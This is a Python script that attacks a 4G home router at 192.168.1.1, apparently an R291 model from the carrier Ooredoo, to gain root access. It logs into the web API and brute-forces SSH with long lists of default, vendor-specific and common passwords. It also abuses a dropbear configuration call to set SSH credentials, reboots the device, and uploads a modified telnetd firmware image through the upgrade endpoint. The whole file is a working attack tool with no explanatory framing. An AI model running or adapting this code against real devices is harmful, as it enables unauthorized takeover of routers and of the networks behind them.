#!/usr/bin/env python3
import sys, os, time, socket, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import api_login, api_ssh, api_upload

ROUTER_IP = "192.168.1.1"

def wait_for_router(timeout=300):
    print(f"[WAIT] Checking {ROUTER_IP}:80 ...")
    for i in range(timeout):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ROUTER_IP, 80))
            s.close()
            print(f"[OK] Router up after {i}s")
            return True
        except:
            time.sleep(2)
    return False

def try_ssh_bruteforce():
    passwords = [
        "", "root", "admin", "password", "12345678", "1234", "12345", "123456",
        "notion", "ooredoo", "Ooredoo", "test", "user", "guest", "toor",
        "Om@0Yt#5", "Om@5Wr%8", "$Passworld143", "Passworld143", "passworld143",
        "P@ssw0rd", "7icF3j8W", "Zte521", "ZTE", "zte",
        "MTK7621", "mtk7621", "mt7621",
        "Superlightweight123", "123456789", "qwerty", "letmein",
        "cmxmc@2o22", "beyless", "Highwmg", "highwmg", "HighWmg",
        "marvell", "Marvell", "PXA1826", "ASR",
        "R291", "r291", "R291V2",
        "wifirp90&$MM", "868139070652232", "R291240826015571",
        "Chongqing", "chongqing", "CHONGQING",
        "Linux", "linux", "LINUX", "OpenWrt", "openwrt",
        "rootroot", "rootrootroot", "rootroot123",
        "password1", "Password1", "PASSWORD1",
        "admin123", "admin1234", "admin12345",
        "root123", "root1234", "root12345",
        "default", "Default", "DEFAULT",
        "router", "Router", "ROUTER",
        "wan", "WAN", "wan123",
        "internet", "Internet", "INTERNET",
        "operator", "Operator", "OPERATOR",
        "service", "Service", "SERVICE",
        "support", "Support", "SUPPORT",
        "info", "Info", "INFO",
        "guest", "Guest", "GUEST",
        "public", "Public", "PUBLIC",
        "private", "Private", "PRIVATE",
        "mobile", "Mobile", "MOBILE",
        "device", "Device", "DEVICE",
        "board", "Board", "BOARD",
        "chip", "Chip", "CHIP",
        "mips", "MIPS", "Mips",
        "mtk", "MTK", "Mtk",
        "fibocom", "Fibocom", "FIBOCOM",
        "sara", "SARA", "Sara",
        "hl", "HL", "hl85", "HL85",
        "module", "Module", "MODULE",
        "cat", "CAT", "Cat",
        "huawei", "Huawei", "HUAWEI",
        "zte", "ZTE", "zte",
        "nokia", "Nokia", "NOKIA",
        "samsung", "Samsung", "SAMSUNG",
        "qualcomm", "Qualcomm", "QUALCOMM",
        "mediatek", "MediaTek", "MEDIATEK",
        "arm", "ARM", "Arm",
        "lte", "LTE", "Lte",
        "4g", "4G", "4g",
        "5g", "5G", "5g",
        "wifi", "WiFi", "WIFI",
        "wan", "WAN",
        "lan", "LAN",
        "ppp", "PPP",
        "ip", "IP",
        "dns", "DNS",
        "dhcp", "DHCP",
        "nat", "NAT",
        "firewall", "Firewall", "FIREWALL",
        "security", "Security", "SECURITY",
    ]
    for pw in passwords:
        r = api_ssh.ssh_connect(pw, timeout=3)
        if r.get("success"):
            print(f"[SSH SUCCESS] password='{pw}'")
            return pw
    return None

# Step 1: Wait for router
if not wait_for_router():
    print("[FAIL] Router did not come up")
    sys.exit(1)

# Step 2: Login
login_ok = api_login.login()
if not login_ok:
    print("[FAIL] Login failed, waiting 20s and retrying...")
    time.sleep(20)
    if not wait_for_router():
        sys.exit(1)
    login_ok = api_login.login()
    if not login_ok:
        print("[FAIL] Login failed again")
        sys.exit(1)
print("[OK] Login successful")

# Step 3: Try SSH brute force
print("\n[BRUTE] Trying SSH passwords...")
found_pw = try_ssh_bruteforce()
if found_pw:
    print(f"\n{'='*60}")
    print(f"  SSH ACCESS GRANTED! password='{found_pw}'")
    print(f"{'='*60}")
    sys.exit(0)
print("[SSH] No password found via brute force")

# Step 4: Try set_dropbear_info with various passwords
print("\n[SET_DROPBEAR] Trying set_dropbear_info...")
for pw in ["", "root", "admin", "password", "notion", "ooredoo", "Ooredoo", "1234"]:
    r = api_ssh.set_dropbear_info(user="root", password=pw, mode="1", key_type="99")
    print(f"  set_dropbear_info(pw='{pw}') → {r.get('response','')[:100]}")
    time.sleep(1)

# Step 5: Reboot
print("\n[REBOOT] Rebooting router...")
api_ssh.reboot()
print("  Waiting 30s for reboot...")
time.sleep(30)

# Step 6: Wait for router
if not wait_for_router(timeout=120):
    print("[FAIL] Router did not come back after reboot")
    sys.exit(1)

# Step 7: Login again
if not api_login.login():
    print("[FAIL] Login failed after reboot, waiting 10s...")
    time.sleep(10)
    if not wait_for_router(timeout=60):
        sys.exit(1)
    if not api_login.login():
        print("[FAIL] Login failed again")
        sys.exit(1)
print("[OK] Login successful after reboot")

# Step 8: Try SSH again with same passwords + some more
print("\n[BRUTE2] Trying SSH passwords again after reboot...")
more_passwords = [
    "system", "System", "SYSTEM", "root!", "Root", "ROOT",
    "ch0ngq1ng", "chongqing123", "password!", "Password!",
    "changeme", "Changeme", "CHANGEME",
    "r291", "R291", "r291v2", "R291V2",
    "{your_password}", "{default_password}",
    "{empty}", "{space}", " ", "  ",
    "Ooredoo1", "ooredoo1", "OOREDOO", "ooredoos",
    "telnet", "Telnet", "TELNET",
    "shell", "Shell", "SHELL",
    "debug", "Debug", "DEBUG",
    "test123", "test1234", "test12345",
    "adminadmin", "rootroot", "toor",
    "nokia", "NOKIA", "nokia7",
    "P@ssw0rd!", "Passw0rd", "passw0rd",
    "iloveyou", "ILoveYou", "iloveu",
    "trustno1", "trustno1", "abc123",
    "qwerty123", "asdfgh", "zxcvbn",
    "welcome", "Welcome", "WELCOME",
    "welcome1", "welcome123",
    "login", "Login", "LOGIN",
    "hello", "Hello", "HELLO",
    "master", "Master", "MASTER",
    "monkey", "Monkey", "MONKEY",
    "dragon", "Dragon", "DRAGON",
    "shadow", "Shadow", "SHADOW",
    "sunshine", "Sunshine", "SUNSHINE",
    "princess", "Princess", "PRINCESS",
    "football", "Football", "FOOTBALL",
    "baseball", "Baseball", "BASEBALL",
    "soccer", "Soccer", "SOCCER",
    "hockey", "Hockey", "HOCKEY",
    "batman", "Batman", "BATMAN",
    "mustang", "Mustang", "MUSTANG",
]
found_pw2 = None
for pw in more_passwords:
    r = api_ssh.ssh_connect(pw, timeout=3)
    if r.get("success"):
        print(f"[SSH SUCCESS 2] password='{pw}'")
        found_pw2 = pw
        break

if found_pw2:
    print(f"\n{'='*60}")
    print(f"  SSH ACCESS GRANTED! password='{found_pw2}'")
    print(f"{'='*60}")
    sys.exit(0)
print("[SSH2] No password found via brute force #2")

# Step 9: Try upload firmware_telnetd.bin via multipart small chunks to START upgrade
print("\n[UPLOAD] Attempting firmware_telnetd.bin small chunk upload via multipart...")
with open("firmware_telnetd.bin", "rb") as f:
    telnet_data = f.read()
chunk = telnet_data[:5120]
r = api_upload.upload_multipart(chunk, "upgrade", field_name="fupgrade.bin", filename="firmware_telnetd_chunk.bin")
print(f"  Multipart upload 5120B → HTTP {r['status']} cause={r.get('error_cause','?')} {r.get('note','')}")
if r.get("success"):
    print("  [OK] Upgrade started! Waiting...")
    time.sleep(30)
    if wait_for_router(timeout=120):
        time.sleep(5)
        if api_login.login():
            print("  Trying SSH with no password...")
            for pw in ["", "root", "admin"]:
                r = api_ssh.ssh_connect(pw, timeout=3)
                if r.get("success"):
                    print(f"  [SSH SUCCESS chunk] pw='{pw}'")
                    sys.exit(0)

print("\n[ALL] All approaches exhausted for now. Try UART hardware access.")
